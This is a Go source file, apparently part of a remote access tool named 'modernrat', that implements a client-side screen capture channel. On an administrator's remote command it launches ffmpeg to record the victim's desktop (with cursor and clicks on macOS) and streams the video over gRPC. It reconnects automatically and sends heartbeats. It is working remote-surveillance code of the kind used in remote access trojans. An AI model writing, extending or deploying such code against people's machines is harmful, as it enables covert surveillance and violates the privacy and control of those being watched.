package main

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	pb "modernrat-client/gen"
)

const captureChunkSize = 64 * 1024

func runScreenCaptureClient(ctx context.Context, client pb.ScreenCaptureServiceClient, userID string) error {
	backoff := reconnectInitialBackoff

	for {
		if err := ctx.Err(); err != nil {
			return err
		}

		stream, err := client.ClientCapture(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			log.Printf("スクリーンキャプチャチャネル接続失敗: %v", err)
		} else {
			state := newScreenCaptureState(stream, userID)
			register := &pb.ScreenCaptureMessage{
				Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER,
				UserId:    userID,
				Text:      "capture ready",
				Timestamp: time.Now().Unix(),
			}
			if err := state.send(register); err != nil {
				log.Printf("スクリーンキャプチャ登録送信失敗: %v", err)
			} else {
				state.startHeartbeat(ctx, heartbeatInterval)
				err = state.receiveLoop(ctx)
			}
			state.shutdown()

			if err != nil && !errors.Is(err, context.Canceled) {
				log.Printf("スクリーンキャプチャストリーム終了: %v", err)
			}
		}

		if ctx.Err() != nil {
			return ctx.Err()
		}

		wait := backoff
		if wait > reconnectMaxBackoff {
			wait = reconnectMaxBackoff
		}
		log.Printf("%v 後にスクリーンキャプチャチャネルの再接続を試みます", wait)
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}

		if backoff < reconnectMaxBackoff {
			backoff *= 2
			if backoff > reconnectMaxBackoff {
				backoff = reconnectMaxBackoff
			}
		}
	}
}

type screenCaptureState struct {
	stream pb.ScreenCaptureService_ClientCaptureClient
	userID string

	sendMu sync.Mutex

	sessionMu sync.RWMutex
	sessions  map[string]*clientCaptureSession

	heartbeatStop      chan struct{}
	heartbeatStartOnce sync.Once
	heartbeatStopOnce  sync.Once
}

func newScreenCaptureState(stream pb.ScreenCaptureService_ClientCaptureClient, userID string) *screenCaptureState {
	return &screenCaptureState{
		stream:        stream,
		userID:        userID,
		sessions:      make(map[string]*clientCaptureSession),
		heartbeatStop: make(chan struct{}),
	}
}

func (s *screenCaptureState) send(msg *pb.ScreenCaptureMessage) error {
	if msg == nil {
		return nil
	}
	if msg.UserId == "" {
		msg.UserId = s.userID
	}
	if msg.Timestamp == 0 {
		msg.Timestamp = time.Now().Unix()
	}

	s.sendMu.Lock()
	err := s.stream.Send(msg)
	s.sendMu.Unlock()
	return err
}

func (s *screenCaptureState) startHeartbeat(ctx context.Context, interval time.Duration) {
	s.heartbeatStartOnce.Do(func() {
		go func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-s.heartbeatStop:
					return
				case <-ticker.C:
					heartbeat := &pb.ScreenCaptureMessage{
						Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT,
						Timestamp: time.Now().Unix(),
					}
					if err := s.send(heartbeat); err != nil {
						log.Printf("スクリーンキャプチャハートビート送信失敗: %v", err)
					}
				}
			}
		}()
	})
}

func (s *screenCaptureState) stopHeartbeat() {
	s.heartbeatStopOnce.Do(func() {
		close(s.heartbeatStop)
	})
}

func (s *screenCaptureState) receiveLoop(ctx context.Context) error {
	for {
		if err := ctx.Err(); err != nil {
			return err
		}

		msg, err := s.stream.Recv()
		if err != nil {
			return err
		}

		switch msg.GetType() {
		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED:
			log.Printf("スクリーンキャプチャチャネル登録完了: %s", msg.GetText())

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_START:
			if err := s.handleStart(ctx, msg); err != nil {
				log.Printf("スクリーンキャプチャ開始処理に失敗: %v", err)
			}

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP:
			s.handleStop(msg)

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT:
			// ignore

		default:
			log.Printf("未対応のスクリーンキャプチャメッセージタイプを受信: %v", msg.GetType())
		}
	}
}

func (s *screenCaptureState) handleStart(ctx context.Context, msg *pb.ScreenCaptureMessage) error {
	sessionID := strings.TrimSpace(msg.GetSessionId())
	if sessionID == "" {
		return s.sendError("", msg.GetRequestId(), "session_id が指定されていません")
	}

	s.sessionMu.Lock()
	if existing := s.sessions[sessionID]; existing != nil {
		existing.stop("duplicate start received")
	}
	s.sessionMu.Unlock()

	session, err := newClientCaptureSession(ctx, s, sessionID, msg.GetRequestId(), msg.GetSettings())
	if err != nil {
		return s.sendError(sessionID, msg.GetRequestId(), fmt.Sprintf("capture start failed: %v", err))
	}

	s.sessionMu.Lock()
	s.sessions[sessionID] = session
	s.sessionMu.Unlock()

	// Notify admin that capture is ready.
	ready := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_READY,
		SessionId: sessionID,
		RequestId: msg.GetRequestId(),
		Text:      "capture pipeline ready",
	}
	if err := s.send(ready); err != nil {
		log.Printf("READY 送信失敗: %v", err)
		session.stop("failed to send READY")
		return err
	}

	session.begin()
	return nil
}

func (s *screenCaptureState) handleStop(msg *pb.ScreenCaptureMessage) {
	sessionID := strings.TrimSpace(msg.GetSessionId())
	if sessionID == "" {
		return
	}

	s.sessionMu.RLock()
	session := s.sessions[sessionID]
	s.sessionMu.RUnlock()

	if session == nil {
		return
	}

	reason := strings.TrimSpace(msg.GetText())
	if reason == "" {
		reason = "stop requested"
	}
	session.stop(reason)
}

func (s *screenCaptureState) onSessionExit(session *clientCaptureSession, exitErr error) {
	s.sessionMu.Lock()
	if existing := s.sessions[session.id]; existing == session {
		delete(s.sessions, session.id)
	}
	s.sessionMu.Unlock()

	msgType := pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE
	text := "capture finished"
	if exitErr != nil {
		msgType = pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR
		text = exitErr.Error()
	}

	notify := &pb.ScreenCaptureMessage{
		Type:      msgType,
		SessionId: session.id,
		RequestId: session.requestID,
		Text:      text,
	}
	if err := s.send(notify); err != nil {
		log.Printf("スクリーンキャプチャ終了通知の送信に失敗: session=%s err=%v", session.id, err)
	}
}

func (s *screenCaptureState) sendData(sessionID, requestID string, chunk []byte) error {
	if len(chunk) == 0 {
		return nil
	}
	payload := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_DATA,
		SessionId: sessionID,
		RequestId: requestID,
		Data:      chunk,
	}
	return s.send(payload)
}

func (s *screenCaptureState) sendError(sessionID, requestID, text string) error {
	errMsg := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
		SessionId: sessionID,
		RequestId: requestID,
		Text:      text,
	}
	return s.send(errMsg)
}

func (s *screenCaptureState) shutdown() {
	s.stopHeartbeat()
	s.sessionMu.RLock()
	snapshot := make([]*clientCaptureSession, 0, len(s.sessions))
	for _, session := range s.sessions {
		snapshot = append(snapshot, session)
	}
	s.sessionMu.RUnlock()

	for _, session := range snapshot {
		session.stop("client shutdown")
	}
}

type clientCaptureSession struct {
	ctx       context.Context
	cancel    context.CancelFunc
	state     *screenCaptureState
	id        string
	requestID string
	settings  *pb.CaptureSettings

	cmd         *exec.Cmd
	outputDone  chan struct{}
	scannerDone chan struct{}
	waitDone    chan struct{}
	stopOnce    sync.Once
}

func newClientCaptureSession(ctx context.Context, state *screenCaptureState, sessionID, requestID string, settings *pb.CaptureSettings) (*clientCaptureSession, error) {
	ffmpegPath, err := resolveFFmpegPath()
	if err != nil {
		return nil, err
	}
	displayArgs, err := buildFFmpegInputArgs(settings)
	if err != nil {
		return nil, err
	}
	outputArgs := buildFFmpegOutputArgs(settings)

	captureCtx, cancel := context.WithCancel(ctx)
	cmd := exec.CommandContext(captureCtx, ffmpegPath, append(displayArgs, outputArgs...)...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, err
	}

	session := &clientCaptureSession{
		ctx:         captureCtx,
		cancel:      cancel,
		state:       state,
		id:          sessionID,
		requestID:   requestID,
		settings:    cloneCaptureSettings(settings),
		cmd:         cmd,
		outputDone:  make(chan struct{}),
		scannerDone: make(chan struct{}),
		waitDone:    make(chan struct{}),
	}

	if err := cmd.Start(); err != nil {
		return nil, err
	}

	go session.readOutput(stdout)
	go session.drainStderr(stderr)
	go session.waitLoop()

	return session, nil
}

func (s *clientCaptureSession) begin() {
	// The ffmpeg subprocess and pipe readers are already running; begin exists for symmetry.
}

func (s *clientCaptureSession) stop(reason string) {
	s.stopOnce.Do(func() {
		if reason != "" {
			log.Printf("スクリーンキャプチャ停止: session=%s reason=%s", s.id, reason)
		}
		if s.cancel != nil {
			s.cancel()
		}
		if s.cmd != nil && s.cmd.Process != nil {
			_ = s.cmd.Process.Signal(os.Interrupt)
			select {
			case <-time.After(500 * time.Millisecond):
				_ = s.cmd.Process.Kill()
			default:
			}
		}
	})
}

func (s *clientCaptureSession) readOutput(r io.ReadCloser) {
	defer close(s.outputDone)
	buf := make([]byte, captureChunkSize)
	for {
		select {
		case <-s.waitDone:
			return
		default:
		}

		n, err := r.Read(buf)
		if n > 0 {
			chunk := append([]byte(nil), buf[:n]...)
			if sendErr := s.state.sendData(s.id, s.requestID, chunk); sendErr != nil {
				log.Printf("スクリーンキャプチャデータ送信失敗: session=%s err=%v", s.id, sendErr)
				s.stop("send failed")
				return
			}
		}
		if err != nil {
			if !errors.Is(err, io.EOF) {
				log.Printf("スクリーンキャプチャ出力読み取りエラー: session=%s err=%v", s.id, err)
			}
			return
		}
	}
}

func (s *clientCaptureSession) drainStderr(r io.ReadCloser) {
	defer close(s.scannerDone)
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		log.Printf("ffmpeg[%s]: %s", s.id, scanner.Text())
	}
}

func (s *clientCaptureSession) waitLoop() {
	defer close(s.waitDone)
	err := s.cmd.Wait()
	var exitErr error
	if err != nil {
		if exitErr = interpretExitError(err); exitErr == nil {
			exitErr = err
		}
	}
	s.state.onSessionExit(s, exitErr)
}

func interpretExitError(err error) error {
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		code := exitErr.ExitCode()
		if code == 0 {
			return nil
		}
		return fmt.Errorf("ffmpeg exited with code %d", code)
	}
	return err
}

func cloneCaptureSettings(settings *pb.CaptureSettings) *pb.CaptureSettings {
	if settings == nil {
		return nil
	}
	copy := *settings
	return &copy
}

func resolveFFmpegPath() (string, error) {
	exe, err := os.Executable()
	if err == nil {
		dir := filepath.Dir(exe)
		for _, candidate := range ffmpegCandidates() {
			path := filepath.Join(dir, candidate)
			if fileExists(path) {
				return path, nil
			}
		}
	}

	for _, candidate := range ffmpegCandidates() {
		if path, err := exec.LookPath(candidate); err == nil {
			return path, nil
		}
	}

	return "", errors.New("ffmpeg executable not found")
}

func ffmpegCandidates() []string {
	if runtime.GOOS == "windows" {
		return []string{"ffmpeg.exe"}
	}
	return []string{"ffmpeg"}
}

func buildFFmpegInputArgs(settings *pb.CaptureSettings) ([]string, error) {
	var args []string
	source := ""
	if settings != nil {
		source = strings.TrimSpace(settings.GetCaptureSource())
	}
	if env := strings.TrimSpace(os.Getenv("MODERNRAT_CAPTURE_SOURCE")); env != "" {
		source = env
	}

	var framerate int32
	if settings != nil {
		framerate = settings.GetFramerate()
	}

	switch runtime.GOOS {
	case "windows":
		if source == "" {
			source = "desktop"
		}
		args = append(args, "-f", "gdigrab")
		if framerate > 0 {
			args = append(args, "-framerate", fmt.Sprint(framerate))
		}
		args = append(args, "-i", source)
	case "darwin":
		if source == "" {
			source = "1:none"
		}
		args = append(args, "-f", "avfoundation")
		if framerate > 0 {
			args = append(args, "-framerate", fmt.Sprint(framerate))
		}
		args = append(args, "-capture_cursor", "1", "-capture_mouse_clicks", "1")
		args = append(args, "-i", source)
	case "linux":
		if source == "" {
			if disp := strings.TrimSpace(os.Getenv("DISPLAY")); disp != "" {
				source = disp
			} else {
				source = ":0.0"
			}
		}
		args = append(args, "-f", "x11grab")
		if framerate > 0 {
			args = append(args, "-framerate", fmt.Sprint(framerate))
		}
		args = append(args, "-i", source)
	default:
		return nil, fmt.Errorf("screen capture not supported on %s", runtime.GOOS)
	}

	// We add common flags after input specification.
	args = append([]string{"-hide_banner", "-loglevel", "info", "-nostdin"}, args...)
	return args, nil
}

func buildFFmpegOutputArgs(settings *pb.CaptureSettings) []string {
	encoder := "libx264"
	format := "mpegts"
	bitrate := int32(0)
	gop := int32(0)
	width := int32(0)
	height := int32(0)

	if settings != nil {
		if e := strings.TrimSpace(settings.GetEncoder()); e != "" {
			encoder = e
		}
		if f := strings.TrimSpace(settings.GetFormat()); f != "" {
			format = f
		}
		bitrate = settings.GetBitrateKbps()
		gop = settings.GetKeyframeInterval()
		width = settings.GetWidth()
		height = settings.GetHeight()
	}

	format = canonicalFFmpegFormat(format)

	args := []string{"-an", "-c:v", encoder, "-preset", "veryfast", "-tune", "zerolatency", "-pix_fmt", "yuv420p"}

	if bitrate > 0 {
		args = append(args, "-b:v", fmt.Sprintf("%dk", bitrate))
	}
	if gop > 0 {
		args = append(args, "-g", fmt.Sprint(gop))
	}

	if width > 0 || height > 0 {
		scaleExpr := buildScaleFilter(width, height)
		if scaleExpr != "" {
			args = append(args, "-vf", scaleExpr)
		}
	}

	args = append(args, "-f", format, "pipe:1")
	return args
}

func buildScaleFilter(width, height int32) string {
	switch {
	case width > 0 && height > 0:
		return fmt.Sprintf("scale=%d:%d", width, height)
	case width > 0:
		return fmt.Sprintf("scale=%d:-2", width)
	case height > 0:
		return fmt.Sprintf("scale=-2:%d", height)
	default:
		return ""
	}
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return !info.IsDir()
}

func canonicalFFmpegFormat(format string) string {
	switch strings.ToLower(strings.TrimSpace(format)) {
	case "video/mp2t", "video/mpegts", "mpegts", "ts":
		return "mpegts"
	case "video/mp4", "mp4":
		return "mp4"
	case "video/webm", "webm":
		return "webm"
	case "video/matroska", "matroska", "mkv":
		return "matroska"
	default:
		return format
	}
}
